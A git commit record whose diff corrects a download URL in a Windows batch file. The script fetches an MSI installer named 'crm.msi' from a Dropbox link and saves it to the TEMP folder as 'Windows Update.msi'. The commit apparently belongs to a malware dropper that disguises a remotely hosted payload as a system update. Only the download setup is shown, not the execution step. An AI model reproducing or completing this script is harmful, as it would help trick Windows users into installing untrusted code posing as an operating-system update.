2ed360d610f1a2b8335f677e3297cbb4faecbf0a
008webhost <tisudam242@gmail.com>
2025-11-24 19:31:05 -0500

    Update file.bat

--- file.bat
+++ file.bat
@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Set download URL and paths
-set "https://dl.dropboxusercontent.com/scl/fi/alf3x72krw2efb5xqatys/crm.msi?rlkey=3kye4tri5h5432dm9h6sqxbsr"
+set "url=https://dl.dropboxusercontent.com/scl/fi/alf3x72krw2efb5xqatys/crm.msi?rlkey=3kye4tri5h5432dm9h6sqxbsr"
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
